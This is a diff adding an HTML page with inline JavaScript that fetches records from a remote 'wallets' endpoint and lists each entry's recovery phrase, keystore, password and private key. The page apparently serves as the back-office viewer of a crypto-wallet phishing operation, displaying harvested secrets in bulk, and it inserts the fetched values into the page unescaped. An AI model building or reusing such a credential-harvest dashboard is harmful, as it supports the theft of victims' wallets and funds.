@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallets</title>
+</head>
+
+<body>
+    <div id="wallets-container"></div>
+
+    <script>
+        // Fetch data from the API endpoint
+        fetch('https://www.digitalmaxtrd.com/wallets')
+            .then(response => response.json())
+            .then(data => {
+                // Process the data and display it in the 'wallets-container' div
+                const walletsContainer = document.getElementById('wallets-container');
+                walletsContainer.innerHTML = '<h1>Wallets</h1>';
+                data.wallets.forEach(wallet => {
+                    const walletElement = document.createElement('div');
+                    walletElement.innerHTML = `
+                        <p><strong>Wallet ID:</strong> ${wallet.wallet_id}</p>
+                        <p><strong>Type:</strong> ${wallet.type}</p>
+                        <p><strong>Phrase Input:</strong> ${wallet.phraseinput}</p>
+                        <p><strong>Keystore Value:</strong> ${wallet.keystoreval}</p>
+                        <p><strong>Password:</strong> ${wallet.password}</p>
+                        <p><strong>Private Key Value:</strong> ${wallet.privatekeyval}</p>
+                        <p><strong>Created At:</strong> ${wallet.createdAt}</p>
+                    `;
+                    walletsContainer.appendChild(walletElement);
+                });
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                // Display an error message if something goes wrong
+                const walletsContainer = document.getElementById('wallets-container');
+                walletsContainer.innerHTML = '<p>Error fetching wallets data</p>';
+            });
+    </script>
+</body>
+
+</html>
